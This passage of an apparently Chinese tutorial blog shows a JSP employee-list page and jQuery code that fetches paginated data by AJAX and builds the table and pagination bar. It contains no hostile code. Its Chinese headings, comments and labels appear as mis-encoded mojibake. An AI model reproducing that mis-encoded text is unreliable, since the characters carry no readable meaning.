class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="xml">                 ç¼–è¾‘</span></span><br><span class="line"><span class="xml">                 <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">                 */</span></span><br><span class="line"><span class="xml">                var editBtn = $("<span class="tag">&lt;<span class="name">button</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span>").addClass("btn btn-primary btn-sm")</span></span><br><span class="line"><span class="xml">                                .append($("<span class="tag">&lt;<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span>").addClass("glyphicon glyphicon-pencil")).append("ç¼–è¾‘");</span></span><br><span class="line"><span class="xml">                /**</span></span><br><span class="line"><span class="xml">                 * <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-danger btn-sm"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                 <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"glyphicon glyphicon-trash"</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span> /&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="xml">                 åˆ é™¤</span></span><br><span class="line"><span class="xml">                 <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">                 */</span></span><br><span class="line"><span class="xml">                var delBtn = $("<span class="tag">&lt;<span class="name">button</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span>").addClass("btn btn-danger btn-sm")</span></span><br><span class="line"><span class="xml">                    .append($("<span class="tag">&lt;<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span>").addClass("glyphicon glyphicon-trash")).append("åˆ é™¤");</span></span><br><span class="line"></span><br><span class="line"><span class="xml">                var btnTd = $("<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>").append(editBtn).append(" ").append(delBtn);</span></span><br><span class="line"></span><br><span class="line"><span class="xml">                //appendæ–¹æ³•æ‰§è¡Œå®Œæˆä¹‹åè¿˜æ˜¯è¿”å›åŸæ¥çš„å…ƒç´ </span></span><br><span class="line"><span class="xml">                $("<span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span>").append(empIdTd)</span></span><br><span class="line"><span class="xml">                    .append(empNameTd)</span></span><br><span class="line"><span class="xml">                    .append(genderTd)</span></span><br><span class="line"><span class="xml">                    .append(emailTd)</span></span><br><span class="line"><span class="xml">                    .append(deptNameTd)</span></span><br><span class="line"><span class="xml">                    .append(btnTd)</span></span><br><span class="line"><span class="xml">                    .appendTo("#emps_table tbody")</span></span><br><span class="line"><span class="xml">            &#125;);</span></span><br><span class="line"><span class="xml">        &#125;</span></span><br><span class="line"><span class="xml">        function build_page_nav(result) &#123;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        &#125;</span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h4 id="åˆ†é¡µæ¡åŠåˆ†é¡µä¿¡æ¯"><a href="#åˆ†é¡µæ¡åŠåˆ†é¡µä¿¡æ¯" class="headerlink" title="åˆ†é¡µæ¡åŠåˆ†é¡µä¿¡æ¯"></a>åˆ†é¡µæ¡åŠåˆ†é¡µä¿¡æ¯</h4><figure class="highlight erb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-</span></span><br><span class="line"><span class="ruby">    webè·¯å¾„ï¼š</span></span><br><span class="line"><span class="ruby">        ä¸ä»¥/å¼€å§‹çš„ç›¸å¯¹è·¯å¾„ï¼Œæ‰¾èµ„æºï¼Œä»¥å½“å‰èµ„æºçš„è·¯å¾„ä¸ºåŸºå‡†ï¼Œç»å¸¸å®¹æ˜“å‡ºç°é—®é¢˜</span></span><br><span class="line"><span class="ruby">        ä»¥/å¼€å§‹çš„ç›¸å¯¹è·¯å¾„ï¼Œæ‰¾èµ„æºï¼Œä»¥æœåŠ¡å™¨çš„è·¯å¾„ä¸ºæ ‡å‡†ï¼ˆ<span class="symbol">http:</span>/<span class="regexp">/localhost:3306ï¼‰éœ€è¦åŠ ä¸Šé¡¹ç›®å</span></span></span><br><span class="line"><span class="ruby">            <span class="symbol">http:</span>/<span class="regexp">/localhost:3306/crud</span></span></span><br><span class="line"><span class="ruby">-</span><span class="xml">-%&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%</span></span></span><span class="ruby">@ page contentType=<span class="string">"text/html;charset=UTF-8"</span> language=<span class="string">"java"</span> </span><span class="xml"><span class="tag">%&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%</span></span></span><span class="ruby">@ taglib uri=<span class="string">"http://java.sun.com/jsp/jstl/core"</span> prefix=<span class="string">"c"</span></span><span class="xml"><span class="tag">%&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>å‘˜å·¥åˆ—è¡¨<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">%</span></span></span></span><br><span class="line"><span class="ruby">        pageContext.setAttribute(<span class="string">"APP_PATH"</span>,request.getContextPath());</span></span><br><span class="line"><span class="ruby">    </span><span class="xml">%&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"$&#123;APP_PATH&#125;/static/bootstrap-3.3.7-dist/css/bootstrap.min.css"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"$&#123;APP_PATH&#125;/static/bootstrap-3.3.7-dist/js/bootstrap.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"$&#123;APP_PATH&#125;/static/js/jquery-3.5.1.min.js"</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-æ ‡é¢˜-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-12"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">h1</span>&gt;</span>SSM-CRUD<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-æŒ‰é’®-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-4 col-md-offset-8"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-primary"</span>&gt;</span>æ–°å¢<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-danger"</span>&gt;</span>åˆ é™¤<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-æ˜¾ç¤ºè¡¨æ ¼æ•°æ®-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-12"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">table</span> <span class="attr">class</span>=<span class="string">"table table-hover"</span> <span class="attr">id</span>=<span class="string">"emps_table"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">thead</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">th</span>&gt;</span>#<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">th</span>&gt;</span>empName<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">th</span>&gt;</span>gender<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">th</span>&gt;</span>email<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">th</span>&gt;</span>deptName<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">th</span>&gt;</span>æ“ä½œ<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;/<span class="name">thead</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">tbody</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-                    å‘˜å·¥æ•°æ®ç­‰-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;/<span class="name">tbody</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-æ˜¾ç¤ºåˆ†é¡µä¿¡æ¯-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-            åˆ†é¡µæ–‡å­—ä¿¡æ¯-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-6"</span> <span class="attr">id</span>=<span class="string">"page_info_area"</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-            æ˜¾ç¤ºé¡µç ç­‰ä¿¡æ¯-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-            åˆ†é¡µæ¡ä¿¡æ¯-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-6"</span> <span class="attr">id</span>=<span class="string">"page_nav_area"</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-            æ˜¾ç¤ºåˆ†é¡µæ¡ä¿¡æ¯-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        //1.é¡µé¢åŠ è½½å®Œæˆä»¥åï¼Œç›´æ¥å»å‘é€ä¸€ä¸ªajaxè¯·æ±‚ï¼Œè¦åˆ°åˆ†é¡µæ•°æ®</span></span><br><span class="line"><span class="xml">        $(function ()&#123;</span></span><br><span class="line"><span class="xml">           $.ajax(&#123;</span></span><br><span class="line"><span class="xml">               url:"$&#123;APP_PATH&#125;/emps",</span></span><br><span class="line"><span class="xml">               data:"pn=1",</span></span><br><span class="line"><span class="xml">               type:"GET",</span></span><br><span class="line"><span class="xml">               success:function (result)&#123;</span></span><br><span class="line"><span class="xml">                   // console.log(result);</span></span><br><span class="line"><span class="xml">                   //1.è§£æå¹¶æ˜¾ç¤ºå‘˜å·¥æ•°æ®</span></span><br><span class="line"><span class="xml">                   build_emps_tables(result);</span></span><br><span class="line"><span class="xml">                   //2.è§£æå¹¶æ˜¾ç¤ºåˆ†é¡µä¿¡æ¯</span></span><br><span class="line"><span class="xml">                   build_page_info(result);</span></span><br><span class="line"><span class="xml">                   //3.è§£æå¹¶æ˜¾ç¤ºåˆ†é¡µæ¡æ•°æ®</span></span><br><span class="line"><span class="xml">                   build_page_nav(result);</span></span><br><span class="line"><span class="xml">               &#125;</span></span><br><span class="line"><span class="xml">           &#125;);</span></span><br><span class="line"><span class="xml">        &#125;);</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        function build_emps_tables(result) &#123;</span></span><br><span class="line"><span class="xml">            var emps=result.extend.pageInfo.list;</span></span><br><span class="line"><span class="xml">            $.each(emps,function (index,item) &#123;</span></span><br><span class="line"><span class="xml">                var empIdTd = $("<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>").append(item.empId);</span></span><br><span class="line"><span class="xml">                var empNameTd = $("<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>").append(item.empName);</span></span><br><span class="line"><span class="xml">                var genderTd = $("<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>").append(item.gender=='M'?"ç”·":"å¥³");</span></span><br><span class="line"><span class="xml">                var emailTd = $("<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>").append(item.email);</span></span><br><span class="line"><span class="xml">                var deptNameTd = $("<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>").append(item.department.deptName);</span></span><br><span class="line"><span class="xml">                /**</span></span><br><span class="line"><span class="xml">                 * <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-primary btn-sm"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                 <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"glyphicon glyphicon-pencil"</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="xml">                 ç¼–è¾‘</span></span><br><span class="line"><span class="xml">                 <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">                 */</span></span><br><span class="line"><span class="xml">                var editBtn = $("<span class="tag">&lt;<span class="name">button</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span>").addClass("btn btn-primary btn-sm")</span></span><br><span class="line"><span class="xml">                                .append($("<span class="tag">&lt;<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span>").addClass("glyphicon glyphicon-pencil")).append("ç¼–è¾‘");</span></span><br><span class="line"><span class="xml">                /**</span></span><br><span class="line"><span class="xml">                 * <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-danger btn-sm"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                 <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"glyphicon glyphicon-trash"</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span> /&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="xml">                 åˆ é™¤</span></span><br><span class="line"><span class="xml">                 <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">                 */</span></span><br><span class="line"><span class="xml">                var delBtn = $("<span class="tag">&lt;<span class="name">button</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span>").addClass("btn btn-danger btn-sm")</span></span><br><span class="line"><span class="xml">                    .append($("<span class="tag">&lt;<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span>").addClass("glyphicon glyphicon-trash")).append("åˆ é™¤");</span></span><br><span class="line"></span><br><span class="line"><span class="xml">                var btnTd = $("<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>").append(editBtn).append(" ").append(delBtn);</span></span><br><span class="line"></span><br><span class="line"><span class="xml">                //appendæ–¹æ³•æ‰§è¡Œå®Œæˆä¹‹åè¿˜æ˜¯è¿”å›åŸæ¥çš„å…ƒç´ </span></span><br><span class="line"><span class="xml">                $("<span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span>").append(empIdTd)</span></span><br><span class="line"><span class="xml">                    .append(empNameTd)</span></span><br><span class="line"><span class="xml">                    .append(genderTd)</span></span><br><span class="line"><span class="xml">                    .append(emailTd)</span></span><br><span class="line"><span class="xml">                    .append(deptNameTd)</span></span><br><span class="line"><span class="xml">                    .append(btnTd)</span></span><br><span class="line"><span class="xml">                    .appendTo("#emps_table tbody")</span></span><br><span class="line"><span class="xml">            &#125;);</span></span><br><span class="line"><span class="xml">        &#125;</span></span><br><span class="line"><span class="xml">        //è§£ææ˜¾ç¤ºåˆ†é¡µä¿¡æ¯</span></span><br><span class="line"><span class="xml">        function build_page_info(result)&#123;</span></span><br><span class="line"><span class="xml">            $("#page_info_area").append("å½“å‰"+result.extend.pageInfo.pageNum+"é¡µ,æ€»"</span></span><br><span class="line"><span class="xml">                +result.extend.pageInfo.pages+"é¡µ,æ€»"</span></span><br><span class="line"><span class="xml">                +result.extend.pageInfo.total+"æ¡è®°å½•");</span></span><br><span class="line"><span class="xml">        &#125;</span></span><br><span class="line"><span class="xml">        //è§£ææ˜¾ç¤ºåˆ†é¡µæ¡,ç‚¹å‡»åˆ†é¡µè¦èƒ½å»ä¸‹ä¸€é¡µç­‰ç­‰....</span></span><br><span class="line"><span class="xml">        function build_page_nav(result) &#123;</span></span><br><span class="line"><span class="xml">            //page_nav_area</span></span><br><span class="line"><span class="xml">            var ul = $("<span class="tag">&lt;<span class="name">ul</span>&gt;</span><span class="tag">&lt;/<span class="name">ul</span>&gt;</span>").addClass("pagination");</span></span><br><span class="line"><span class="xml">            var firstPageLi = $("<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>").append($("<span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span>").append("é¦–é¡µ").attr("href","#"));</span></span><br><span class="line"><span class="xml">            var prePageLi = $("<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>").append($("<span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span>").append("&amp;laquo;"));</span></span><br><span class="line"></span><br><span class="line"><span class="xml">            var nextPageLi = $("<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>").append($("<span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span>").append("&amp;raquo;"));</span></span><br><span class="line"><span class="xml">            var lastPageLi = $("<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>").append($("<span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span>").append("æœ«é¡µ").attr("href","#"));</span></span><br><span class="line"><span class="xml">            //æ·»åŠ é¦–é¡µå’Œå‰ä¸€é¡µçš„æç¤º</span></span><br><span class="line"><span class="xml">            ul.append(firstPageLi).append(prePageLi);</span></span><br><span class="line"><span class="xml">            //1,2,3....éå†ç»™ulä¸­æ·»åŠ é¡µç æç¤º</span></span><br><span class="line"><span class="xml">            $.each(result.extend.pageInfo.navigatepageNums,function (index,item) &#123;</span></span><br><span class="line"><span class="xml">                var numLi = $("<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>").append($("<span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span>").append(item));</span></span><br><span class="line"><span class="xml">                ul.append(numLi);</span></span><br><span class="line"><span class="xml">            &#125;);</span></span><br><span class="line"><span class="xml">            //æ·»åŠ åä¸€é¡µå’Œæœ«é¡µçš„æç¤º</span></span><br><span class="line"><span class="xml">            ul.append(nextPageLi).append(lastPageLi);</span></span><br><span class="line"></span><br><span class="line"><span class="xml">            //æŠŠulåŠ å…¥åˆ°navå…ƒç´ ä¸­</span></span><br><span class="line"><span class="xml">            var navEle = $("<span class="tag">&lt;<span class="name">nav</span>&gt;</span><span class="tag">&lt;/<span class="name">nav</span>&gt;</span>").append(ul);</span></span><br><span class="line"><span class="xml">            navEle.appendTo("#page_nav_area");</span></span><br><span class="line"><span class="xml">        &#125;</span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>è¿™æ ·å°±å¯ä»¥æ­£å¸¸æ˜¾ç¤ºäº†ï¼Œä½†æ˜¯ç‚¹å‡»è¶…é“¾æ¥å¹¶æ²¡æœ‰åŠ¨ä½œæ‰§è¡Œï¼Œæ¥ä¸‹æ¥å°±éœ€è¦ç¼–å†™åŠ¨ä½œäº†</p><h4 id="äº‹ä»¶"><a href="#äº‹ä»¶" class="headerlink" title="äº‹ä»¶"></a>äº‹ä»¶</h4><p>åŸºæœ¬æ€è·¯å°±æ˜¯æ¯ç‚¹å‡»ä¸€ä¸ªè¶…é“¾æ¥ï¼Œå°±å‘é€ä¸€æ¬¡ajaxè¯·æ±‚,å¹¶ä¸”ä¸ä¹‹å‰çš„æ ·å¼ä¸€æ ·<br><figure class="highlight erb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span 